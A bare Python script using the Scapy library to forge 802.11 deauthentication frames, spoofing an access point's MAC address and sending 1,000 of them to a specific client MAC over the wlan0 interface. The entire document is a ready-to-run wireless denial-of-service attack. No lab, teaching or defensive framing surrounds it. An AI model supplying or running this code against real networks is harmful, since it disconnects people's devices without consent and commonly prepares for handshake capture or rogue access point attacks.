from scapy.all import *
targmac = "A0:CC:2B:BD:E2:9D"
apmac = "60:38:E0:7D:68:5B"
packet = RadioTap()/Dot11(addr1=targmac,addr2=apmac,addr3=apmac)/Dot11Deauth()

sendp(packet,iface="wlan0",count=1000,inter=.2)